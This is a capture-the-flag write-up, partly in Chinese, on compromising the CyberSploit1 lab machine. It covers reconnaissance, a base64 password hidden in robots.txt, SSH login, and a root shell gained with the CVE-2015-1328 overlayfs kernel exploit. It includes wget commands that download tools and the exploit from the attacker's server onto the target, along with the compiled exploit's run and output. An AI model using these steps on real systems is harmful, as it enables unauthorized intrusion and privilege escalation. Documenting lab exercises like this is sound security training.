# CyberSploit1
![image](https://hackmd.io/_uploads/H1PneOK3Jx.png)
## Soulution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV 192.168.111.92
Nmap scan report for 192.168.111.92
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds

```
#### 1.2 dirsearch
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://192.168.111.92/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/chw/reports/http_192.168.111.92/__25-03-20_06-59-27.txt

Target: http://192.168.111.92/

...
[07:00:11] 200 -   73B  - /robots.txt
...
```
查看 /robots.txt 內容
```
┌──(chw㉿CHW)-[~]
└─$ curl http://192.168.111.92/robots.txt
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=      
```
(Base64 decode)\
`cybersploit{youtube.com/c/cybersploit}` ??!
#### 1.3 Source code
view-source:http://192.168.111.92/#\
![image](https://hackmd.io/_uploads/HJAEO_YnJg.png)
> comment 中透露 User: `itsskv`

### 2. SSH Login
用 `itsskv`:`cybersploit{youtube.com/c/cybersploit}`
```
┌──(chw㉿CHW)-[~]
└─$ ssh itsskv@192.168.111.92
The authenticity of host '192.168.111.92 (192.168.111.92)' can't be established.
ECDSA key fingerprint is SHA256:19IzxsJJ/ZH00ix+vmS6+HQqDcXtk9k30aT3K643kSs.
...

Your Hardware Enablement Stack (HWE) is supported until April 2017.

itsskv@cybersploit-CTF:~$ whoami
itsskv
```
> 成功登入

### ✅ Get User Flag
> 在 `/home/itsskv`找到 User flag
## Privileges Escalation
### 1. LinPEAS
```
┌──(chw㉿CHW)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
itsskv@cybersploit-CTF:~$ wget http://192.168.45.193/linpeas.sh
itsskv@cybersploit-CTF:~$ chmod +x linpeas.sh 
itsskv@cybersploit-CTF:~$ ./linpeas.sh
```
### 2. searchsploit
```
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
```
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit Linux 3.13.0-32
...
inux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                  | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                          | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                 | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                       | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                  | linux/local/37293.txt
...
┌──(chw㉿CHW)-[~]
└─$ searchsploit -m 37292
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/chw/37292.c

```
### 3. exploit
```
itsskv@cybersploit-CTF:~$ wget http://192.168.45.193/37292.c
itsskv@cybersploit-CTF:~$ cat 37292.c 
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
```
依照 exploit 步驟
```
itsskv@cybersploit-CTF:~$ gcc 37292.c -o ofs
itsskv@cybersploit-CTF:~$ ./ofs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)

```
### ✅ Get Root FLAG
